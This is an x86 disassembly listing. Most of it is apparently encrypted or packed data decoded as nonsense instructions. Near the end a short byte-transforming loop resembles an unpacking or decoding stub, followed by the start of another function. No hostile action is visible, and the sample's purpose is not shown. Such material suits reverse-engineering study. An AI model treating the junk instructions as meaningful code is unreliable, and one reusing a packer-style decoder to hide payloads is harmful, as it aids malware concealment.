  420d9b:	mov    bh,0x69
  420d9d:	mov    esi,DWORD PTR [edx+0x35697f5c]
  420da3:	lds    edx,FWORD PTR [edi-0x1c45ea5b]
  420da9:	cmp    dh,ch
  420dab:	mov    ds:0x25d2fc6,al
  420db0:	fiadd  DWORD PTR [ebx]
  420db2:	mov    edi,0x645d4c94
  420db7:	lods   al,BYTE PTR ds:[esi]
  420db8:	ins    DWORD PTR es:[edi],dx
  420db9:	mul    BYTE PTR [esi-0x2b]
  420dbc:	xchg   ecx,eax
  420dbd:	lock xchg BYTE PTR [edi+esi*1+0x40],dl
  420dc2:	mov    dh,0xdf
  420dc4:	pop    es
  420dc5:	out    dx,eax
  420dc6:	in     al,0xf2
  420dc8:	test   al,0x51
  420dca:	stc    
  420dcb:	cmp    eax,0x4638f05b
  420dd0:	sub    BYTE PTR [edx],al
  420dd2:	xor    BYTE PTR [esi-0x6e],al
  420dd5:	out    dx,eax
  420dd6:	or     ebx,DWORD PTR [ebp-0x4a]
  420dd9:	into   
  420dda:	xchg   esp,eax
  420ddb:	or     al,0xa6
  420ddd:	or     esp,ebp
  420ddf:	mov    dl,0x93
  420de1:	dec    edi
  420de2:	test   BYTE PTR [edx+ebx*8-0x77dcb40d],cl
  420de9:	adc    ebp,ebx
  420deb:	sbb    al,0x71
  420ded:	pop    esp
  420dee:	outs   dx,DWORD PTR ds:[esi]
  420def:	mov    al,ds:0x550692af
  420df4:	adc    dl,BYTE PTR [eax+edx*2+0xb2d7219]
  420dfb:	and    al,0x38
  420dfd:	ins    DWORD PTR es:[edi],dx
  420dfe:	sbb    al,0x4d
  420e00:	gs mov eax,cs:0xb417aecb
  420e07:	jg     0x420d98
  420e09:	inc    ebx
  420e0a:	aas    
  420e0b:	and    bl,BYTE PTR [edx+ebp*2-0x7b7f09e9]
  420e12:	fbld   TBYTE PTR [edx]
  420e14:	xor    DWORD PTR [esi-0x42],ebp
  420e17:	nop
  420e18:	stos   BYTE PTR es:[edi],al
  420e19:	lods   eax,DWORD PTR ds:[esi]
  420e1a:	jne    0x420e12
  420e1c:	pop    edx
  420e1d:	cmp    al,0x5a
  420e1f:	push   0xffffff83
  420e21:	(bad)  
  420e22:	jns    0x420e22
  420e24:	add    BYTE PTR [edx*8-0x3120e824],ch
  420e2b:	xchg   BYTE PTR [esi+0x13e5cf14],dl
  420e31:	out    0xd7,al
  420e33:	mov    edi,0x2d1a6450
  420e38:	add    dl,BYTE PTR [edi-0x7c]
  420e3b:	jno    0x420e2c
  420e3d:	inc    esi
  420e3e:	aas    
  420e3f:	loopne 0x420e64
  420e41:	mov    ds:0x6c7dd7aa,al
  420e46:	rcl    BYTE PTR [eax+0x21a64074],0x5c
  420e4d:	test   eax,0xe9eb7b96
  420e52:	je     0x420e81
  420e54:	pop    ebp
  420e55:	movntq QWORD PTR [eax+0x6b00528a],mm4
  420e5c:	out    0x17,al
  420e5e:	mov    esp,0x7007a68
  420e63:	cdq    
  420e64:	add    DWORD PTR [edx-0x1fab85c7],ebx
  420e6a:	ds xchg ch,dh
  420e6d:	stos   BYTE PTR es:[edi],al
  420e6e:	sub    BYTE PTR [esi-0x48],al
  420e71:	push   es
  420e72:	push   esp
  420e73:	fcom   QWORD PTR [esi-0x42]
  420e76:	bound  edx,QWORD PTR [ebp+0x6a]
  420e79:	and    esp,ebp
  420e7b:	xor    cl,BYTE PTR [edx-0x2169f59b]
  420e81:	jg     0x420e10
  420e83:	mov    eax,ds:0x9847d661
  420e88:	js     0x420e2d
  420e8a:	adc    ch,BYTE PTR [ebx]
  420e8c:	add    ecx,DWORD PTR [esi+edi*4+0x3a]
  420e90:	or     BYTE PTR [ecx],ch
  420e92:	add    ah,al
  420e94:	fnstenv [esi]
  420e96:	push   ebx
  420e97:	sbb    eax,0x93dfadfd
  420e9c:	jge    0x420e6c
  420e9e:	ret    
  420e9f:	mov    ah,0xbb
  420ea1:	mov    esi,0xe81467df
  420ea6:	pop    ds
  420ea7:	adc    BYTE PTR [edx-0x6696f45e],cl
  420ead:	mov    cl,0x3a
  420eaf:	inc    edx
  420eb0:	pushf  
  420eb1:	out    0xb5,al
  420eb3:	jmp    0x9ae2d0d4
  420eb8:	jns    0x420f0a
  420eba:	imul   ebp,DWORD PTR [ebp+0x57],0x64
  420ebe:	jbe    0x420ea4
  420ec0:	mov    al,ds:0xd5625bd4
  420ec5:	xor    eax,0xf63fc2de
  420eca:	fstp   TBYTE PTR [edx+0x25]
  420ecd:	and    al,0xdd
  420ecf:	aad    0xe0
  420ed1:	je     0x420f41
  420ed3:	and    BYTE PTR [edi],ch
  420ed5:	mov    esp,edi
  420ed7:	mov    bl,0x58
  420ed9:	leave  
  420eda:	mov    al,0xcf
  420edc:	pop    ecx
  420edd:	out    0xfb,al
  420edf:	scas   al,BYTE PTR es:[edi]
  420ee0:	aam    0x81
  420ee2:	ja     0x420e9a
  420ee4:	aad    0xa4
  420ee6:	push   es
  420ee7:	xchg   ecx,eax
  420ee8:	jmp    0xa1675469
  420eed:	sbb    esi,edi
  420eef:	push   esi
  420ef0:	dec    ebx
  420ef1:	test   al,0xec
  420ef3:	mov    dh,0xb3
  420ef5:	test   BYTE PTR [ecx-0x3d],bl
  420ef8:	call   0xbd0f:0x748e0a1b
  420eff:	mov    WORD PTR [esi+0x1f5ed191],ss
  420f05:	pop    ss
  420f06:	xchg   ecx,eax
  420f07:	stos   DWORD PTR es:[edi],eax
  420f08:	dec    esi
  420f09:	into   
  420f0a:	add    al,0xe4
  420f0c:	fwait
  420f0d:	add    eax,0x8ea10094
  420f12:	pop    ebp
  420f13:	jmp    0xeb0d:0xc81aa88e
  420f1a:	stc    
  420f1b:	mov    ecx,0x8c02a890
  420f20:	test   al,0xa6
  420f22:	inc    esp
  420f23:	xchg   esi,eax
  420f24:	push   cs
  420f25:	aam    0x22
  420f27:	out    dx,eax
  420f28:	mov    BYTE PTR [ecx-0x18],ch
  420f2b:	xor    ch,BYTE PTR ds:0x242b9cbf
  420f31:	pop    edi
  420f32:	push   cs
  420f33:	ds jbe 0x420f75
  420f36:	pop    ecx
  420f37:	mov    ds:0xdca6e4ae,al
  420f3c:	lods   eax,DWORD PTR ds:[esi]
  420f3d:	jg     0x420f6e
  420f3f:	cmc    
  420f40:	xor    al,0xb1
  420f42:	in     al,dx
  420f43:	sub    dh,cl
  420f45:	sbb    ch,BYTE PTR [ebp+0x5a]
  420f48:	aaa    
  420f49:	mov    eax,ds:0xda419dc9
  420f4e:	call   0x12a6:0xee104950
  420f55:	and    eax,0x3a54b00b
  420f5a:	fwait
  420f5b:	mov    esi,0x417a63d8
  420f60:	pop    ss
  420f61:	or     al,0x90
  420f63:	pusha  
  420f64:	js     0x420fe0
  420f66:	mov    eax,ds:0xe03cce0e
  420f6b:	inc    edx
  420f6c:	cs arpl di,bp
  420f6f:	(bad)  
  420f70:	jmp    0x420f28
  420f72:	lea    edi,[esp+esi*1-0x6e37a163]
  420f79:	adc    DWORD PTR [ecx+esi*2],edx
  420f7c:	mov    fs,WORD PTR [esi-0x50c4acf9]
  420f82:	mov    al,0xe0
  420f84:	push   esp
  420f85:	and    bh,BYTE PTR [edx-0x67]
  420f88:	stc    
  420f89:	jbe    0x420f37
  420f8b:	and    BYTE PTR [edx],al
  420f8d:	je     0x420f17
  420f8f:	jl     0x420f53
  420f91:	push   edx
  420f92:	jmp    0x420fe8
  420f94:	hlt    
  420f95:	adc    eax,0xb338f7a0
  420f9a:	jmp    0x420fc8
  420f9c:	xlat   BYTE PTR ds:[ebx]
  420f9d:	mov    dl,0x7d
  420f9f:	in     al,0xa3
  420fa1:	xor    BYTE PTR [ebx],0x61
  420fa4:	js     0x420fc3
  420fa6:	inc    ebx
  420fa7:	add    al,0x2
  420fa9:	mov    dl,0x7c
  420fab:	dec    edi
  420fac:	adc    DWORD PTR [ecx+0x22f660bf],edx
  420fb2:	jae    0x42101c
  420fb4:	or     edx,ebp
  420fb6:	push   0xffffffab
  420fb8:	bound  esi,QWORD PTR [edi+0x410ee407]
  420fbe:	enter  0xa1f9,0xde
  420fc2:	loopne 0x421024
  420fc4:	sbb    BYTE PTR [edx-0x4d],0x1
  420fc8:	mov    ebp,0xbeb6bed4
  420fcd:	ins    DWORD PTR es:[edi],dx
  420fce:	or     DWORD PTR [eax-0x49],edi
  420fd1:	in     al,0x2f
  420fd3:	mov    cl,0x69
  420fd5:	enter  0x8f78,0x48
  420fd9:	or     DWORD PTR [ebp-0x9],ecx
  420fdc:	cmp    eax,0x8073edb0
  420fe1:	mov    dh,0x3e
  420fe3:	setg   BYTE PTR [ecx]
  420fe6:	cwde   
  420fe7:	pop    ebx
  420fe8:	sahf   
  420fe9:	inc    ecx
  420fea:	mov    al,0xc
  420fec:	mov    bh,0xc3
  420fee:	inc    ebx
  420fef:	mov    eax,0x3830361f
  420ff4:	rol    DWORD PTR [ebx+ebp*2-0xeea6a08],1
  420ffb:	jo     0x42100d
  420ffd:	cli    
  420ffe:	xchg   ebx,eax
  420fff:	push   edi
  421000:	cvtdq2ps xmm0,xmm1
  421003:	bound  ebp,QWORD PTR [esi-0x5b87c27f]
  421009:	xlat   BYTE PTR ds:[ebx]
  42100a:	adc    eax,0x2f4aee62
  42100f:	(bad)  
  421010:	jae    0x421046
  421012:	mov    edi,0x72aa2689
  421017:	xchg   DWORD PTR [ecx-0x77],ebx
  42101a:	loopne 0x420fde
  42101c:	mov    ecx,0xf3e4f264
  421021:	cmp    ecx,eax
  421023:	jecxz  0x420fcb
  421025:	sub    esi,esp
  421027:	pop    esi
  421028:	jmp    0x420ff2
  42102a:	add    DWORD PTR [esi],0x6119b51e
  421030:	loope  0x420fc3
  421032:	xor    BYTE PTR [eax],ch
  421034:	jbe    0x421077
  421036:	mov    ecx,0x10dfd9ab
  42103b:	sub    BYTE PTR [ecx-0x3595e6a6],bl
  421041:	sbb    DWORD PTR [ebx],esi
  421043:	or     cl,BYTE PTR [edi-0x7834f32f]
  421049:	pusha  
  42104a:	mov    bl,0x28
  42104c:	or     eax,0x5e090840
  421051:	fxam   
  421053:	fwait
  421054:	test   eax,0x9252f41b
  421059:	mov    ds:0xcb74ed39,al
  42105e:	mov    esi,0xec078df6
  421063:	xchg   esi,eax
  421064:	stc    
  421065:	lea    esi,[ecx+eax*8+0x7004ed3d]
  42106c:	mov    esp,0xdbdb76aa
  421071:	mov    ds:0xfe32326b,eax
  421076:	int    0xdf
  421078:	pop    ebp
  421079:	sti    
  42107a:	pushf  
  42107b:	les    ebx,FWORD PTR [eax+0x5a8a14eb]
  421081:	fstp   QWORD PTR [edx]
  421083:	cmc    
  421084:	mov    ds:0xd8bcb877,eax
  421089:	sbb    BYTE PTR [esi],cl
  42108b:	retf   0x955d
  42108e:	shr    DWORD PTR [ebp-0x5e],cl
  421091:	cwde   
  421092:	ret    
  421093:	adc    BYTE PTR [ebp+edi*8-0x4d],0xc2
  421098:	sub    BYTE PTR [eax+0xd],ch
  42109b:	cmc    
  42109c:	pop    edi
  42109d:	sub    eax,0xd468a89d
  4210a2:	sahf   
  4210a3:	xchg   edx,eax
  4210a4:	cmp    DWORD PTR [ebp-0x2c1f6c61],ebx
  4210aa:	push   ss
  4210ab:	in     eax,0x15
  4210ad:	jl     0x42109e
  4210af:	std    
  4210b0:	adc    al,0x14
  4210b2:	and    ebp,DWORD PTR [edx-0x55]
  4210b5:	and    al,al
  4210b7:	cmp    ebx,DWORD PTR [edi]
  4210b9:	fxch   st(0)
  4210bb:	jnp    0x42109a
  4210bd:	sahf   
  4210be:	dec    edx
  4210bf:	ficom  DWORD PTR [ecx-0x2]
  4210c2:	inc    eax
  4210c3:	mov    bl,0x6e
  4210c5:	mov    eax,0xa83fb37d
  4210ca:	xchg   edi,eax
  4210cb:	mov    cl,0xb
  4210cd:	loope  0x42110f
  4210cf:	push   ebp
  4210d0:	add    DWORD PTR [ebp-0x1b97f4c],esi
  4210d6:	adc    eax,DWORD PTR [ebx+ebx*1+0x13]
  4210da:	test   DWORD PTR [edi],0x1170eca5
  4210e0:	bound  esi,QWORD PTR [ebp-0x48]
  4210e3:	fstp   TBYTE PTR [ebx-0x58f6572e]
  4210e9:	fs jp  0x4210bf
  4210ec:	ja     0x42113e
  4210ee:	stos   DWORD PTR es:[edi],eax
  4210ef:	mov    dh,0x5a
  4210f1:	outs   dx,DWORD PTR ds:[esi]
  4210f2:	and    ebp,esi
  4210f4:	stos   BYTE PTR es:[edi],al
  4210f5:	cmp    eax,0x420aae68
  4210fa:	dec    eax
  4210fb:	std    
  4210fc:	loope  0x421170
  4210fe:	arpl   WORD PTR [ebp+0x55],di
  421101:	jno    0x421135
  421103:	pop    edi
  421104:	test   dh,dl
  421106:	or     ecx,DWORD PTR [ebp+0x64ac8e93]
  42110c:	or     BYTE PTR [eax-0x66b86864],ch
  421112:	dec    ecx
  421113:	stos   BYTE PTR es:[edi],al
  421114:	repz cmp al,0x53
  421117:	sub    ebp,ecx
  421119:	sub    eax,0xb53f5b27
  42111e:	enter  0xf0f2,0xd0
  421122:	cmp    DWORD PTR [ecx+0x4],ecx
  421125:	stc    
  421126:	repnz pop esp
  421128:	ret    0x80e7
  42112b:	mov    ebp,edx
  42112d:	scas   al,BYTE PTR es:[edi]
  42112e:	cmp    eax,0x7bd15a5
  421133:	addr16 and edi,edx
  421136:	call   0x9d69:0xa4ef5b02
  42113d:	jl     0x421102
  42113f:	push   ecx
  421140:	dec    edi
  421141:	lahf   
  421142:	sbb    DWORD PTR [ebp-0x687137c4],esp
  421148:	imul   DWORD PTR [edx+0x7ea85fd8]
  42114e:	xchg   ecx,eax
  42114f:	hlt    
  421150:	test   DWORD PTR [ebx],esp
  421152:	mov    ds:0xde828b63,eax
  421157:	pop    eax
  421158:	xchg   esi,eax
  421159:	add    cl,ah
  42115b:	dec    esp
  42115c:	inc    eax
  42115d:	clc    
  42115e:	cld    
  42115f:	das    
  421160:	jns    0x4211b7
  421162:	jg     0x4210f3
  421164:	mov    ecx,0xad91cc70
  421169:	sar    ch,0x75
  42116c:	cwde   
  42116d:	rol    BYTE PTR [eax+0x7f],cl
  421170:	retf   0xd6e4
  421173:	inc    eax
  421174:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421176:	shl    ebp,1
  421178:	and    DWORD PTR [edx],esp
  42117a:	pop    ebx
  42117b:	cmc    
  42117c:	add    ecx,eax
  42117e:	pop    esi
  42117f:	shl    DWORD PTR [edi+eax*8],cl
  421182:	xor    ah,BYTE PTR [edx-0x3d82e202]
  421188:	xchg   esp,eax
  421189:	(bad)  
  42118a:	retf   
  42118b:	in     al,0x16
  42118d:	shl    bh,1
  42118f:	mov    ecx,0x60edef91
  421194:	jbe    0x421171
  421196:	dec    esp
  421197:	loop   0x42118e
  421199:	sbb    dl,BYTE PTR [eax]
  42119b:	jl     0x42117d
  42119d:	mov    ds:0xdb8e05e2,al
  4211a2:	jmp    FWORD PTR [esi+0x7f]
  4211a5:	or     bh,BYTE PTR [ebx-0x1f366bcc]
  4211ab:	push   0xffffff8e
  4211ad:	inc    eax
  4211ae:	sar    BYTE PTR [edi+0x62f9739f],1
  4211b4:	sar    BYTE PTR [ebp-0x7d],1
  4211b7:	out    0x11,eax
  4211b9:	into   
  4211ba:	add    BYTE PTR [esi-0x699b7e2a],bh
  4211c0:	dec    ecx
  4211c1:	mov    esp,ecx
  4211c3:	outs   dx,DWORD PTR ds:[esi]
  4211c4:	(bad)  
  4211c5:	xchg   esi,eax
  4211c6:	inc    esp
  4211c7:	fstp   DWORD PTR [ebp+0xc721b7f]
  4211cd:	mov    al,BYTE PTR [ebx+eiz*1-0x319be4ab]
  4211d4:	ret    0x5f5f
  4211d7:	aam    0xf3
  4211d9:	adc    edx,edx
  4211db:	mov    esi,0x20f464ef
  4211e0:	retf   
  4211e1:	aaa    
  4211e2:	cdq    
  4211e3:	ror    DWORD PTR [esi+0x5f0401a0],0x44
  4211ea:	rcr    ebx,cl
  4211ec:	dec    esi
  4211ed:	test   eax,0xa76496d5
  4211f2:	jns    0x421229
  4211f4:	dec    eax
  4211f5:	stos   DWORD PTR es:[edi],eax
  4211f6:	outs   dx,DWORD PTR ds:[esi]
  4211f7:	imul   DWORD PTR ds:0xe8e7100b
  4211fd:	mov    ecx,0x45d53393
  421202:	xchg   ebp,eax
  421203:	fwait
  421204:	ret    
  421205:	fsubr  st,st(7)
  421207:	mov    ds:0xd839f460,al
  42120c:	data16 add BYTE PTR [eax-0x653431c],dl
  421213:	lea    eax,[ecx-0x39]
  421216:	push   eax
  421217:	mov    ah,0xf3
  421219:	aaa    
  42121a:	mov    ebp,0xbd24da69
  42121f:	lods   al,BYTE PTR ds:[esi]
  421220:	neg    BYTE PTR [esi+ecx*8+0x5a7ac078]
  421227:	imul   edi,DWORD PTR [edi+0x5a],0xb
  42122b:	lahf   
  42122c:	ror    BYTE PTR [eax+eax*2-0x7d7c109e],0x30
  421234:	(bad)  
  421235:	sar    DWORD PTR [ecx-0x18],cl
  421238:	(bad)  
  421239:	fstp   DWORD PTR [edx]
  42123b:	std    
  42123c:	enter  0xe792,0xff
  421240:	(bad)  
  421241:	out    dx,al
  421242:	sub    eax,0x4787d70d
  421247:	js     0x42128a
  421249:	mov    al,0xdb
  42124b:	mov    al,0xdc
  42124d:	adc    BYTE PTR [ebx+0x12354032],al
  421253:	loope  0x421245
  421255:	mov    esi,0xbae5248f
  42125a:	add    bh,BYTE PTR [ecx]
  42125c:	mov    edi,0x1e287631
  421261:	push   ss
  421262:	sub    al,ah
  421264:	(bad)  
  421265:	mov    edi,0x3e93f5fa
  42126a:	cmp    al,0x24
  42126c:	mov    bl,dh
  42126e:	lahf   
  42126f:	pop    ebp
  421270:	loope  0x421221
  421272:	mov    eax,0xb1530ac4
  421277:	pop    edi
  421278:	push   edx
  421279:	xchg   BYTE PTR [edi+0x19],al
  42127c:	and    ch,ah
  42127e:	sub    BYTE PTR [eax+0x1d],bl
  421281:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421282:	int    0x1
  421284:	fwait
  421285:	in     al,dx
  421286:	cdq    
  421287:	repz mov ah,0xee
  42128a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42128b:	push   esi
  42128c:	or     eax,0x10b0171d
  421291:	fsub   QWORD PTR [edx+0x68ba3ea]
  421297:	jns    0x421281
  421299:	ror    ebx,1
  42129b:	les    ebx,FWORD PTR [edi+0x9]
  42129e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42129f:	mov    esi,ds
  4212a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212a2:	jmp    0xb5c02704
  4212a7:	jle    0x4212a1
  4212a9:	lock fisttp DWORD PTR gs:[ecx+0x4cbcff66]
  4212b1:	mov    dh,0x54
  4212b3:	je     0x4212cb
  4212b5:	mov    ds:0xc72475af,al
  4212ba:	cmp    DWORD PTR [ecx],edx
  4212bc:	jne    0x4212b4
  4212be:	aam    0xe1
  4212c0:	inc    ebx
  4212c1:	pop    eax
  4212c2:	cmp    ah,0xba
  4212c5:	loope  0x4212d2
  4212c7:	aaa    
  4212c8:	jmp    ebx
  4212ca:	xchg   ebx,eax
  4212cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212cc:	rcl    ah,cl
  4212ce:	repz mov ?,WORD PTR [ecx-0x17465b58]
  4212d5:	scas   eax,DWORD PTR es:[edi]
  4212d6:	mov    ebx,0x943aba62
  4212db:	adc    al,0x6d
  4212dd:	int    0x1b
  4212df:	sub    bh,BYTE PTR [ebx+0x7e9c62ef]
  4212e5:	sub    edx,edx
  4212e7:	imul   esi,ebx,0xeca6d08b
  4212ed:	pushf  
  4212ee:	pop    edi
  4212ef:	mov    dl,0xfa
  4212f1:	mov    ch,dh
  4212f3:	mov    ah,0x0
  4212f5:	sub    DWORD PTR [ebp+0x64b4a8c3],0xfd1ff44b
  4212ff:	and    al,0x98
  421301:	lds    ecx,FWORD PTR [ecx]
  421303:	mov    ch,0x9a
  421305:	adc    ebp,DWORD PTR [edx-0x30201075]
  42130b:	xor    eax,0xdff24a35
  421310:	cmp    dl,BYTE PTR [ebp-0x3339df3a]
  421316:	lea    edi,[eax-0x2e04e23c]
  42131c:	sti    
  42131d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42131e:	fmul   st,st(0)
  421320:	cmp    dh,bh
  421322:	iret   
  421323:	loope  0x4212ff
  421325:	inc    BYTE PTR [esi+0x48]
  421328:	mov    ds,esi
  42132a:	in     eax,0x17
  42132c:	shr    BYTE PTR [esp+ecx*4+0x716a5914],cl
  421333:	nop
  421334:	and    BYTE PTR [esi-0x6ae7ae19],bl
  42133a:	inc    eax
  42133b:	push   eax
  42133c:	lods   eax,DWORD PTR ds:[esi]
  42133d:	mov    esi,ebx
  42133f:	test   DWORD PTR [edx+0xa63c128],0xfa41e02e
  421349:	arpl   WORD PTR [eax],bx
  42134b:	fwait
  42134c:	outs   dx,DWORD PTR ds:[esi]
  42134d:	jnp    0x421317
  42134f:	mov    dh,0x2b
  421351:	xlat   BYTE PTR ds:[ebx]
  421352:	jmp    0x467d:0x30d037c1
  421359:	and    DWORD PTR [esi+0x72705cd1],ecx
  42135f:	push   edx
  421360:	mov    ds:0xc8c9286c,eax
  421365:	mov    edx,0x9b022ab8
  42136a:	mov    dh,0x5a
  42136c:	scas   eax,DWORD PTR es:[edi]
  42136d:	add    BYTE PTR [ebx-0x45d66cfc],bl
  421373:	fadd   QWORD PTR [edx]
  421375:	fidiv  DWORD PTR ds:0xb699a5cc
  42137b:	add    ah,BYTE PTR [eax+0x46]
  42137e:	or     BYTE PTR [ecx],bl
  421380:	retf   
  421381:	fsubr  st,st(2)
  421383:	popf   
  421384:	std    
  421385:	ins    DWORD PTR es:[edi],dx
  421386:	stc    
  421387:	inc    ebp
  421388:	aaa    
  421389:	sub    BYTE PTR [esp+edx*4],bh
  42138c:	inc    edi
  42138d:	int3   
  42138e:	sbb    ecx,esp
  421390:	jmp    0x5412b324
  421395:	dec    ebp
  421396:	sbb    al,0x4e
  421398:	pop    ds
  421399:	add    al,0x56
  42139b:	mul    DWORD PTR [edi]
  42139d:	mov    cl,0xdc
  42139f:	sub    bl,BYTE PTR [eax+0x50]
  4213a2:	mov    eax,0xa4eb758b
  4213a7:	add    bh,ah
  4213a9:	in     eax,0x2
  4213ab:	jecxz  0x421373
  4213ad:	sub    ebp,edi
  4213af:	in     al,dx
  4213b0:	icebp  
  4213b1:	lea    ebx,[esi-0x48]
  4213b4:	ds cmp eax,0xc9fc3ad9
  4213ba:	xor    esi,DWORD PTR [edx-0x4b]
  4213bd:	xor    eax,0xfe867f37
  4213c2:	push   ebx
  4213c3:	rcl    edi,cl
  4213c5:	xchg   ecx,eax
  4213c6:	mov    ds:0xc4f61da5,eax
  4213cb:	inc    ebp
  4213cc:	cmc    
  4213cd:	mov    ecx,0xf3285c3a
  4213d2:	xlat   BYTE PTR ds:[ebx]
  4213d3:	xor    dl,BYTE PTR [ebx]
  4213d5:	test   DWORD PTR [edx],0xa9071d4f
  4213db:	push   ds
  4213dc:	fs ss ins BYTE PTR es:[edi],dx
  4213df:	mov    ebp,ds
  4213e1:	or     eax,0x716c8c3c
  4213e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213e7:	push   eax
  4213e8:	sub    cl,BYTE PTR [esi-0x592134cf]
  4213ee:	dec    edi
  4213ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213f0:	ja     0x421418
  4213f2:	leave  
  4213f3:	stos   BYTE PTR es:[edi],al
  4213f4:	jl     0x4213a5
  4213f6:	cmp    edx,DWORD PTR [edi+ebp*8+0x37ed8362]
  4213fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213fe:	popa   
  4213ff:	in     al,dx
  421400:	mov    dl,0x7a
  421402:	jmp    0xe587:0xd9e3b1b3
  421409:	xchg   ebx,eax
  42140a:	add    ch,bl
  42140c:	std    
  42140d:	shl    al,0x4c
  421410:	out    dx,al
  421411:	dec    esi
  421412:	push   ebp
  421413:	hlt    
  421414:	lds    esi,FWORD PTR [eax-0x5af9475e]
  42141a:	not    DWORD PTR [ebx]
  42141c:	mov    eax,0xf23a06e6
  421421:	inc    esp
  421422:	icebp  
  421423:	fiadd  WORD PTR [esi+0x36]
  421426:	jno    0x42146a
  421428:	jmp    0x10c8:0x33cc0dd6
  42142f:	imul   esp,DWORD PTR [eax],0x623d42ec
  421435:	daa    
  421436:	pop    ds
  421437:	aad    0xc
  421439:	mov    ch,0xc7
  42143b:	xchg   ecx,eax
  42143c:	mov    dh,0x9
  42143e:	je     0x4213fb
  421440:	into   
  421441:	inc    esi
  421442:	mov    esi,0xa1f71a24
  421447:	push   ss
  421448:	and    ebp,DWORD PTR [ecx]
  42144a:	fadd   DWORD PTR [esi+0x69]
  42144d:	jo     0x42148a
  42144f:	push   edx
  421450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421451:	jo     0x421477
  421453:	les    edx,FWORD PTR [edi]
  421455:	test   eax,0x6ba9c108
  42145a:	inc    edx
  42145b:	push   ecx
  42145c:	and    DWORD PTR [ebx-0x67],0x242e13fd
  421463:	test   al,0xbc
  421465:	xor    al,0x19
  421467:	fisttp DWORD PTR [edx-0x67]
  42146a:	and    DWORD PTR [ebx+0x4c1022c0],esp
  421470:	dec    ebx
  421471:	and    esp,ecx
  421473:	cs push ebx
  421475:	es jp  0x4214d8
  421478:	push   ss
  421479:	popf   
  42147a:	pop    ss
  42147b:	cmp    al,0x4d
  42147d:	in     al,0x5d
  42147f:	mov    dh,0xfc
  421481:	mov    al,ds:0x75e6c139
  421486:	jo     0x4214da
  421488:	fwait
  421489:	pop    ds
  42148a:	mov    esi,esp
  42148c:	(bad)  
  42148d:	shl    BYTE PTR [ebx+0x5c],0xcb
  421491:	mov    ds:0x64a90cda,eax
  421496:	and    BYTE PTR [esi+0xd69cfeb],dh
  42149c:	popa   
  42149d:	dec    esp
  42149e:	jno    0x42151a
  4214a0:	mov    ds:0x28b8a9e0,eax
  4214a5:	call   0xb0120c9d
  4214aa:	sub    DWORD PTR [ebx],0x5a84f626
  4214b0:	fucom  st(6)
  4214b2:	push   cs
  4214b3:	sahf   
  4214b4:	mov    WORD PTR [edi+0x5962f328],cs
  4214ba:	in     eax,0x22
  4214bc:	push   cs
  4214bd:	gs das 
  4214bf:	ds and ebx,edx
  4214c2:	fwait
  4214c3:	and    eax,0x3c4f1179
  4214c8:	mov    eax,ds:0x90c3c033
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
